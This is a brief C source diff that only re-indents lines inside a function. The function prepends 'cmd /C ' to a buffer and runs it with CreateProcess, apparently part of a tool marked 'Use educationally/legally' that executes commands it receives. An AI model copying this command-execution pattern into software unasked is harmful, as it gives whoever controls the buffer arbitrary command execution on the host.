@@ -90,8 +90,8 @@ Use educationally/legally.
 		char cmd[BUFLEN+8] = "cmd /C ";
 		strcat(cmd, buf);
 
-		// Launch the child process & execute the command. 
-		BOOL i_result = CreateProcess(NULL,
+	    // Launch the child process & execute the command. 
+	    BOOL i_result = CreateProcess(NULL,
 					cmd,
 					NULL,
 					NULL,
@@ -110,7 +110,7 @@ Use educationally/legally.
 		CloseHandle(pi.hProcess);
 		CloseHandle(pi.hThread);
 
-		return i_result;
+	    return i_result;
 	}
 #endif
 
